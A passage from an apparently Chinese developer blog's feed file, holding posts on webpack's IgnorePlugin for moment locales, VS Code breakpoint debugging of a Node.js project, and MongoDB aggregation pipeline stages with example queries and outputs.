title="IgnorePlugin"></a>IgnorePlugin</h2><p>这是 webpack 内置插件，它的作用是：忽略第三方包指定目录，让这些指定目录不要被打包进去。</p><p>比如我们要使用 <code>moment</code> 这个第三方依赖库，该库主要是对时间进行格式化，并且支持多个国家语言。虽然我设置了语言为中文，但是在打包的时候，是会将所有语言都打包进去的。这样就导致包很大，打包速度又慢。对此，我们可以用 <code>IgnorePlugin</code> 使得指定目录被忽略，从而使得打包变快，文件变小。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> Webpack <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'webpack'</span><span class="token punctuation">)</span>plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>  <span class="token comment" spellcheck="true">//moment这个库中，如果引用了./locale/目录的内容，就忽略掉，不会打包进去</span>  <span class="token keyword">new</span> <span class="token class-name">Webpack<span class="token punctuation">.</span>IgnorePlugin</span><span class="token punctuation">(</span><span class="token regex">/\.\/locale/</span><span class="token punctuation">,</span> <span class="token regex">/moment/</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们虽然按照上面的方法忽略了包含<code>’./locale/&#39;</code>该字段路径的文件目录，但是也使得我们使用的时候不能显示中文语言了，所以这个时候可以手动引入中文语言的目录。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">import</span> moment <span class="token keyword">from</span> <span class="token string">'moment'</span><span class="token comment" spellcheck="true">//手动引入所需要的语言包</span><span class="token keyword">import</span> <span class="token string">'moment/locale/zh-cn'</span>moment<span class="token punctuation">.</span><span class="token function">locale</span><span class="token punctuation">(</span><span class="token string">'zh-cn'</span><span class="token punctuation">)</span><span class="token keyword">let</span> r <span class="token operator">=</span> <span class="token function">moment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">endOf</span><span class="token punctuation">(</span><span class="token string">'day'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fromNow</span><span class="token punctuation">(</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> webpack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webpack </tag>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vscode断点调试node</title>
      <link href="2021/04/22/vscode%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95node/"/>
      <url>2021/04/22/vscode%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95node/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在平时前端开发时，前端代码在浏览器上能很方便的断点调试，那么如果要调试node后端接口的话，该如何实现断点调试呢？</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ol><li><p>vscode打开node项目点击左侧调试按钮<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpsdkdukl7j30cg0bmaaz.jpg" alt="image-20210422114604687"></p></li><li><p>点击Run and Debug<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpsdqrjvwhj30bl092q4n.jpg" alt="image-20210422115211686"></p></li><li><p>选择语言为nodejs<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpsdro9svzj31110803zs.jpg" alt="image-20210422115306221"></p></li><li><p>点击设置按钮添加配置<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpsdsjskbkj30ei07v0tw.jpg" alt="image-20210422115355821"></p></li><li><p>更改lanuch.json配置文件<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpsdtg0v8pj30th0afdhd.jpg" alt="image-20210422115449595"></p></li><li><p>添加自己的项目启动脚本文件和配置</p><pre class="line-numbers language-json"><code class="language-json"><span class="token punctuation">{</span>    // 使用 IntelliSense 了解相关属性。     // 悬停以查看现有属性的描述。    // 欲了解更多信息，请访问<span class="token operator">:</span> https<span class="token operator">:</span>//go.microsoft.com/fwlink/?linkid=<span class="token number">830387</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"0.2.0"</span><span class="token punctuation">,</span>    <span class="token property">"configurations"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">{</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"node"</span><span class="token punctuation">,</span>            <span class="token property">"request"</span><span class="token operator">:</span> <span class="token string">"launch"</span><span class="token punctuation">,</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"启动程序"</span><span class="token punctuation">,</span>            <span class="token property">"env"</span><span class="token operator">:</span> <span class="token punctuation">{</span>                <span class="token property">"NODE_ENV"</span><span class="token operator">:</span> <span class="token string">"development"</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token property">"program"</span><span class="token operator">:</span> <span class="token string">"${workspaceFolder}/bin/www"</span>        <span class="token punctuation">}</span>    <span class="token punctuation">]</span><span class="token punctuation">}</span>//program这个是我自己的node项目的启动文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><ol start="7"><li><p>再次点击断点调试按钮启动断点调试<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpshpynhqzj30bx0a60uj.jpg" alt="image-20210422115727574"></p></li><li><p>直接点击启动程序启动断点调试<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpshrsx3ttj30yi0c9dm9.jpg" alt="image-20210422141138335"></p></li><li><p>直接在代码左侧需要断点的位置打个断点标记，执行方法是会自动出发断点<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpshv6frkwj30jv0ajjst.jpg" alt="image-20210422141453212"></p></li><li><p>然后通过上面的调试按钮一步步断点<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpshwe19w5j30ob0drdig.jpg" alt="image-20210422141603851"></p></li><li><p>鼠标悬浮还可以看到断点的数据<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpshxaavy4j30jc072ab7.jpg" alt="image-20210422141655187"></p></li><li><p>当然也可在debug console控制台输出断点数据的结果 相当于浏览器断点是的console控制台<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpsi084mskj30ns0b60us.jpg" alt="image-20210422141944344"></p></li><li><p>如果要结束断点直接点击上面的暂停键<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpshy49kwhj30on0d5445.jpg" alt="image-20210422141743539"></p></li><li><p>以上就是整个vscode断点配置和断点调试的教程</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> nodejs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> nodejs </tag>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB多条件聚合</title>
      <link href="2021/04/19/MongoDB%E5%A4%9A%E6%9D%A1%E4%BB%B6%E8%81%9A%E5%90%88/"/>
      <url>2021/04/19/MongoDB%E5%A4%9A%E6%9D%A1%E4%BB%B6%E8%81%9A%E5%90%88/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>MongoDB 中聚合(aggregate)主要用于处理数据(诸如统计平均值，求和等)，并返回计算后的数据结果。</p><p>有点类似 <strong>SQL</strong> 语句中的 <strong>count(*)</strong>。</p><h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h2><table><thead><tr><th>表达式</th><th>描述</th></tr></thead><tbody><tr><td>$match</td><td>用于过滤数据，只输出符合条件的文档。$match使用MongoDB的标准查询操作。</td></tr><tr><td>$project</td><td>修改输入文档的结构。可以用来重命名、增加或删除域，也可以用于创建计算结果以及嵌套文档。</td></tr><tr><td>$limit</td><td>用来限制MongoDB聚合管道返回的文档数。</td></tr><tr><td>$skip</td><td>在聚合管道中跳过指定数量的文档，并返回余下的文档。</td></tr><tr><td>$unwind</td><td>将文档中的某一个数组类型字段拆分成多条，每条包含数组中的一个值。</td></tr><tr><td>$group</td><td>将集合中的文档分组，可用于统计结果。</td></tr><tr><td>$sort</td><td>将输入文档排序后输出。</td></tr><tr><td>$lookup</td><td>联表查询</td></tr><tr><td>$geoNear</td><td>输出接近某一地理位置的有序文档。</td></tr><tr><td>$facet/$bucket</td><td>分类搜索（MongoDB 3.4以上支持）</td></tr></tbody></table><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="match"><a href="#match" class="headerlink" title="$match"></a>$match</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//查询条件 以某个分组查询 （可以多个查询条件累加到match里面）</span>db<span class="token punctuation">.</span><span class="token function">getCollection</span><span class="token punctuation">(</span><span class="token string">'doc_views'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">aggregate</span><span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token punctuation">{</span>        $match<span class="token punctuation">:</span> <span class="token punctuation">{</span> <span class="token string">"orgName"</span> <span class="token punctuation">:</span> <span class="token string">"前端技术部"</span> <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//查询结果如下</span><span class="token comment" spellcheck="true">/* 1 */</span><span class="token punctuation">{</span>    <span class="token string">"_id"</span> <span class="token punctuation">:</span> <span class="token function">ObjectId</span><span class="token punctuation">(</span><span class="token string">"5fcb2c6cdfebd2682b2ae01b"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">"__v"</span> <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token string">"time"</span> <span class="token punctuation">:</span> <span class="token string">"2020-11-11"</span><span class="token punctuation">,</span>    <span class="token string">"docName"</span> <span class="token punctuation">:</span> <span class="token string">"testPublishAll"</span><span class="token punctuation">,</span>    <span class="token string">"orgGroup"</span> <span class="token punctuation">:</span> <span class="token string">"汽车事业群"</span><span class="token punctuation">,</span>    <span class="token string">"orgName"</span> <span class="token punctuation">:</span> <span class="token string">"前端技术部"</span><span class="token punctuation">,</span>    <span class="token string">"count"</span> <span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token operator">...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="project"><a href="#project" class="headerlink" title="$project"></a>$project</h4><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//删减字段</span>db<span class="token punctuation">.</span><span class="token function">getCollection</span><span class="token punctuation">(</span><span class="token string">'doc_views'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">aggregate</span><span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token punctuation">{</span>        $match<span class="token punctuation">:</span> <span class="token punctuation">{</span> <span class="token string">"orgName"</span> <span class="token punctuation">:</span> <span class="token string">"前端技术部"</span> <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span>        $project<span class="token punctuation">:</span> <span class="token punctuation">{</span>            docName<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>            orgName<span class="token punctuation">:</span> <span class="token boolean">true</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//查询结果如下 只显示设置为true的字段</span><span class="token comment" spellcheck="true">/* 1 */</span><span class="token punctuation">{</span>    <span class="token string">"_id"</span> <span class="token punctuation">:</span> <span class="token function">ObjectId</span><span class="token punctuation">(</span><span class="token string">"5fcb2c6cdfebd2682b2ae01b"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">"docName"</span> <span class="token punctuation">:</span> <span class="token string">"testPublishAll"</span><span class="token punctuation">,</span>    <span class="token string">"orgName"</span> <span class="token punctuation">:</span> <span class="token string">"前端技术部"</span><span class="token punctuation">}</span><span class="token operator">...</span><span class="token comment" spellcheck="true">//定义别名 把orgGroup指定指定成count字段</span>db<span class="token punctuation">.</span><span class="token function">getCollection</span><span class="token punctuation">(</span><span class="token string">'doc_views'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">aggregate</span><span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token punctuation">{</span>        $match<span class="token punctuation">:</span> <span class="token punctuation">{</span> <span class="token string">"orgName"</span> <span class="token punctuation">:</span> <span class="token string">"前端技术部"</span> <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span>        $project<span class="token punctuation">:</span> <span class="token punctuation">{</span>            docName<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>            orgName<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>            orgGroup<span class="token punctuation">:</span> <span class="token string">"$count"</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//查询结果orgGroup字段展示count的值</span><span class="token comment" spellcheck="true">/* 1 */</span><span class="token punctuation">{</span>    <span class="token string">"_id"</span> <span class="token punctuation">:</span> <span class="token function">ObjectId</span><span class="token punctuation">(</span><span class="token string">"5fcb2c6cdfebd2682b2ae01b"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">"docName"</span> <span class="token punctuation">:</span> <span class="token string">"testPublishAll"</span><span class="token punctuation">,</span>    <span class="token string">"orgName"</span> <span class="token punctuation">:</span> <span class="token string">"前端技术部"</span><span class="token punctuation">,</span>    <span class="token string">"orgGroup"</span> <span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="group"><a href="#group" class="headerlink" title="$group"></a>$group</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//聚合条件 _id ：强制必须存在。 </span>db<span class="token punctuation">.</span><span class="token function">getCollection</span><span class="token punctuation">(</span><span class="token string">'doc_views'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">aggregate</span><span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token punctuation">{</span>        $group<span class="token punctuation">:</span> <span class="token punctuation">{</span>             _id<span class="token punctuation">:</span> <span class="token punctuation">{</span> name<span class="token punctuation">:</span> <span class="token string">"$docName"</span><span class="token punctuation">,</span> orgName<span class="token punctuation">:</span> <span class="token string">"$orgName"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>           total<span class="token punctuation">:</span> <span class="token punctuation">{</span> $sum<span class="token punctuation">:</span> <span class="token string">"$count"</span> <span class="token punctuation">}</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//1、_id: null  _id为null的查询结果</span><span class="token comment" spellcheck="true">/* 1 */</span><span class="token punctuation">{</span>    <span class="token string">"_id"</span> <span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>    <span class="token string">"total"</span> <span class="token punctuation">:</span> <span class="token number">474</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//2、_id: "$docName" _id为某字段</span><span class="token comment" spellcheck="true">/* 1 */</span><span class="token punctuation">{</span>    <span class="token string">"_id"</span> <span class="token punctuation">:</span> <span class="token string">"gch-gitbook"</span><span class="token punctuation">,</span>    <span class="token string">"total"</span> <span class="token punctuation">:</span> <span class="token number">8</span><span class="token punctuation">}</span><span class="token operator">...</span><span class="token comment" spellcheck="true">//3、_id: { name: "$docName", orgName: "$orgName" } _id查询条件并为字段定义别名</span><span class="token comment" spellcheck="true">/* 1 */</span><span class="token punctuation">{</span>    <span class="token string">"_id"</span> <span class="token punctuation">:</span> <span class="token punctuation">{</span>        <span class="token string">"name"</span> <span class="token punctuation">:</span> <span class="token string">"vuepress-hjw-test"</span><span class="token punctuation">,</span>        <span class="token string">"orgName"</span> <span class="token punctuation">:</span> <span class="token string">"前端技术部"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token string">"total"</span> <span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="sort、-skip、-limit"><a href="#sort、-skip、-limit" class="headerlink" title="$sort、$skip、$limit"></a>$sort、$skip、$limit</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//列表分页的时候一般三个联合使用来做数据分页</span><span class="token comment" spellcheck="true">//sort列表排序 skip指定跳过多少条 limit每次查询条数</span><span class="token comment" spellcheck="true">//skip的计算方式：(当前页码-1)*每页大小 如：(pageIndex - 1) * pageSize</span>db<span class="token punctuation">.</span><span class="token function">getCollection</span><span class="token punctuation">(</span><span class="token string">'doc_views'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">aggregate</span><span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token punctuation">{</span>$sort<span class="token punctuation">:</span> <span class="token punctuation">{</span>_id<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span>$skip<span class="token punctuation">:</span><span class="token function">Number</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span>$limit<span class="token punctuation">:</span><span class="token function">Number</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//查询结果如下</span><span class="token comment" spellcheck="true">/* 1 */</span><span class="token punctuation">{</span>    <span class="token string">"_id"</span> <span class="token punctuation">:</span> <span class="token function">ObjectId</span><span class="token punctuation">(</span><span class="token string">"604ecc57b3b65a411b5600de"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">"__v"</span> <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token string">"time"</span> <span class="token punctuation">:</span> <span class="token string">"2021-02-25"</span><span class="token punctuation">,</span>    <span class="token string">"docName"</span> <span class="token punctuation">:</span> <span class="token string">"abgFeedback"</span><span class="token punctuation">,</span>    <span class="token string">"docType"</span> <span class="token punctuation">:</span> <span class="token string">"vuepress"</span><span class="token punctuation">,</span>    <span class="token string">"orgGroup"</span> <span class="token punctuation">:</span> <span class="token string">"汽车事业群"</span><span class="token punctuation">,</span>    <span class="token string">"orgName"</span> <span class="token punctuation">:</span> <span class="token string">"前端技术部"</span><span class="token punctuation">,</span>    <span class="token string">"count"</span> <span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/* 2 */</span><span class="token punctuation">{</span>    <span class="token string">"_id"</span> <span class="token punctuation">:</span> <span class="token function">ObjectId</span><span class="token punctuation">(</span><span class="token string">"604ecc57b3b65a411b5600dd"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">"__v"</span> <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token string">"time"</span> <span class="token punctuation">:</span> <span class="token string">"2021-02-24"</span><span class="token punctuation">,</span>    <span class="token string">"docName"</span> <span class="token punctuation">:</span> <span class="token string">"testtestdocs"</span><span class="token punctuation">,</span>    <span class="token string">"docType"</span> <span class="token punctuation">:</span> <span class="token string">"docsify"</span><span class="token punctuation">,</span>    <span class="token string">"orgGroup"</span> <span class="token punctuation">:</span> <span class="token string">"汽车事业群"</span><span class="token punctuation">,</span>    <span class="token string">"orgName"</span> <span class="token punctuation">:</span> <span class="token string">"前端技术部"</span><span class="token punctuation">,</span>    <span class="token string">"count"</span> <span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="lookup"><a href="#lookup" class="headerlink" title="$lookup"></a>$lookup</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//联表查询</span>db<span class="token punctuation">.</span><span class="token function">getCollection</span><span class="token punctuation">(</span><span class="token string">'doc_views'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">aggregate</span><span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token punctuation">{</span>$sort<span class="token punctuation">:</span> <span class="token punctuation">{</span>_id<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span>$skip<span class="token punctuation">:</span><span class="token function">Number</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span>$limit<span class="token punctuation">:</span><span class="token function">Number</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span>$lookup<span class="token punctuation">:</span><span class="token punctuation">{</span>        <span class="token keyword">from</span><span class="token punctuation">:</span> <span class="token string">"docs"</span><span class="token punctuation">,</span>        localField<span class="token punctuation">:</span> <span class="token string">"docName"</span><span class="token punctuation">,</span>        foreignField<span class="token punctuation">:</span> <span class="token string">"name"</span><span class="token punctuation">,</span>        <span class="token keyword">as</span><span class="token punctuation">:</span> <span class="token string">"child"</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//查询结果</span><span class="token comment" spellcheck="true">/* 1 */</span><span class="token punctuation">{</span>    <span class="token string">"_id"</span> <span class="token punctuation">:</span> <span class="token function">ObjectId</span><span class="token punctuation">(</span><span class="token string">"604ecc57b3b65a411b5600de"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">"__v"</span> <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token string">"time"</span> <span class="token punctuation">:</span> <span class="token string">"2021-02-25"</span><span class="token punctuation">,</span>    <span class="token string">"docName"</span> <span class="token punctuation">:</span> <span class="token string">"abgFeedback"</span><span class="token punctuation">,</span>    <span class="token string">"docType"</span> <span class="token punctuation">:</span> <span class="token string">"vuepress"</span><span class="token punctuation">,</span>    <span class="token string">"orgGroup"</span> <span class="token punctuation">:</span> <span class="token string">"汽车事业群"</span><span class="token punctuation">,</span>    <span class="token string">"orgName"</span> <span class="token punctuation">:</span> <span class="token string">"前端技术部"</span><span class="token punctuation">,</span>    <span class="token string">"count"</span> <span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>    <span class="token string">"child"</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span>         <span class="token punctuation">{</span>            <span class="token string">"_id"</span> <span class="token punctuation">:</span> <span class="token function">ObjectId</span><span class="token punctuation">(</span><span class="token string">"5f6da851a18a783210da7a16"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">"docType"</span> <span class="token punctuation">:</span> <span class="token string">"vuepress"</span><span class="token punctuation">,</span>            <span class="token string">"name"</span> <span class="token punctuation">:</span> <span class="token string">"abgFeedback"</span><span class="token punctuation">,</span>            <span class="token string">"description"</span> <span class="token punctuation">:</span> <span class="token string">"二手车问题反馈收集问题"</span><span class="token punctuation">,</span>            <span class="token string">"owner"</span> <span class="token punctuation">:</span> <span class="token string">"gongchenghui"</span><span class="token punctuation">,</span>            <span class="token string">"orgGroup"</span> <span class="token punctuation">:</span> <span class="token string">"汽车事业群"</span><span class="token punctuation">,</span>            <span class="token string">"orgName"</span> <span class="token punctuation">:</span> <span class="token string">"前端技术部"</span><span class="token punctuation">,</span>            <span class="token string">"newGit"</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token string">"toTop"</span> <span class="token punctuation">:</span> <span class="token function">ISODate</span><span class="token punctuation">(</span><span class="token string">"2020-11-20T02:41:33.742Z"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">"realName"</span> <span class="token punctuation">:</span> <span class="token string">"龚成辉"</span><span class="token punctuation">,</span>            <span class="token string">"dest"</span> <span class="token punctuation">:</span> <span class="token string">"abgFeedback"</span><span class="token punctuation">,</span>            <span class="token string">"opendFiles"</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token string">"createTime"</span> <span class="token punctuation">:</span> <span class="token function">ISODate</span><span class="token punctuation">(</span><span class="token string">"2020-09-25T08:20:33.373Z"</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="facet-分类查询"><a href="#facet-分类查询" class="headerlink" title="$facet 分类查询"></a>$facet 分类查询</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//根据条件 分类一次查询出想要的数据和数据的总数</span>db<span class="token punctuation">.</span><span class="token function">getCollection</span><span class="token punctuation">(</span><span class="token string">'doc_views'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">aggregate</span><span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token punctuation">{</span>$match<span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">"orgName"</span> <span class="token punctuation">:</span> <span class="token string">"前端技术部"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span>        $facet<span class="token punctuation">:</span> <span class="token punctuation">{</span>            respData<span class="token punctuation">:</span> <span class="token punctuation">[</span>                <span class="token punctuation">{</span>$sort<span class="token punctuation">:</span> <span class="token punctuation">{</span>_id<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                <span class="token punctuation">{</span>$skip<span class="token punctuation">:</span><span class="token function">Number</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                <span class="token punctuation">{</span>$limit<span class="token punctuation">:</span><span class="token function">Number</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            total<span class="token punctuation">:</span> <span class="token punctuation">[</span>                <span class="token punctuation">{</span>                    $count<span class="token punctuation">:</span> <span class="token string">"total"</span>                <span class="token punctuation">}</span>            <span class="token punctuation">]</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//查询结果如下</span>  <span class="token comment" spellcheck="true">/* 1 */</span><span class="token punctuation">{</span>    <span class="token string">"respData"</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span>         <span class="token punctuation">{</span>            <span class="token string">"_id"</span> <span class="token punctuation">:</span> <span class="token function">ObjectId</span><span class="token punctuation">(</span><span class="token string">"604ecc57b3b65a411b5600de"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">"__v"</span> <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token string">"time"</span> <span class="token punctuation">:</span> <span class="token string">"2021-02-25"</span><span class="token punctuation">,</span>            <span class="token string">"docName"</span> <span class="token punctuation">:</span> <span class="token string">"abgFeedback"</span><span class="token punctuation">,</span>            <span class="token string">"docType"</span> <span class="token punctuation">:</span> <span class="token string">"vuepress"</span><span class="token punctuation">,</span>            <span class="token string">"orgGroup"</span> <span class="token punctuation">:</span> <span class="token string">"汽车事业群"</span><span class="token punctuation">,</span>            <span class="token string">"orgName"</span> <span class="token punctuation">:</span> <span class="token string">"前端技术部"</span><span class="token punctuation">,</span>            <span class="token string">"count"</span> <span class="token punctuation">:</span> <span class="token number">1</span>        <span class="token punctuation">}</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"total"</span> <span class="token punctuation">:</span> <span class="token 